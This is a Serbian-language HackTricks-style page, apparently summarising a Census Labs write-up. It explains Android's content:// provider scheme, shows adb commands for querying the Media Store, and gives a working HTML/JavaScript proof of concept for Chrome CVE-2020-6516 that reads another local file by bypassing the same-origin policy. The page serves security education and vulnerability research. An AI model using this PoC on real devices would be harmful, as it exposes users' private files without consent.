# content:// protocol

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

**Ovo je sažetak posta** [**https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/**](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)

#### Listanje fajlova u Media Store-u

Da biste izlistali fajlove koje upravlja Media Store, možete koristiti sledeću komandu:

```bash
$ content query --uri content://media/external/file
```

Za prikazivanje lako čitljivog izlaza, prikazujemo samo identifikator i putanju svake indeksirane datoteke:

```bash
$ content query --uri content://media/external/file --projection _id,_data
```

Provajderi sadržaja su izolovani u sopstvenom privatnom prostoru imena. Pristup provajderu zahteva određeni `content://` URI. Informacije o putanjama za pristup provajderu mogu se dobiti iz manifesta aplikacije ili izvornog koda Android okvira.

#### Pristup Chrome-a provajderima sadržaja

Chrome na Androidu može pristupiti provajderima sadržaja putem šeme `content://`, što mu omogućava pristup resursima poput fotografija ili dokumenata izvezenih od strane aplikacija trećih lica. Da bismo to ilustrovali, može se umetnuti datoteka u Media Store i zatim pristupiti joj putem Chrome-a:

Umetnite prilagođeni unos u Media Store:

```bash
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```

Otkrijte identifikator novododatog fajla:

```bash
content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```

Fajl se može pregledati u Chrome-u koristeći URL konstruisan sa identifikatorom fajla.

Na primer, da biste prikazali listu fajlova koji su povezani sa određenom aplikacijom:

```bash
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```

#### Chrome CVE-2020-6516: Bypass Same-Origin-Policy

_Same Origin Policy_ (SOP) je sigurnosni protokol u pregledačima koji ograničava web stranice da komuniciraju sa resursima sa različitih izvora, osim ako to nije eksplicitno dozvoljeno politikom Cross-Origin-Resource-Sharing (CORS). Ova politika ima za cilj sprečavanje curenja informacija i CSRF napada. Chrome smatra `content://` lokalnom šemom, što implicira strože SOP pravila, gde se svaki URL lokalne šeme tretira kao zaseban izvor.

Međutim, CVE-2020-6516 je bila ranjivost u Chrome-u koja je omogućavala zaobilaženje SOP pravila za resurse učitane putem `content://` URL-a. U suštini, JavaScript kod sa `content://` URL-a mogao je pristupiti drugim resursima učitanim putem `content://` URL-a, što je predstavljalo značajan sigurnosni problem, posebno na Android uređajima koji su koristili verzije pre Android 10, gde nije bila implementirana ograničena memorija.

Dole je prikazan primer koji demonstrira ovu ranjivost, gde se HTML dokument, nakon što je otpremljen na **/sdcard** i dodat u Media Store, koristi `XMLHttpRequest` u svom JavaScript kodu da pristupi i prikaže sadržaj druge datoteke u Media Store-u, zaobilazeći SOP pravila.

HTML Primer:

```xml
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
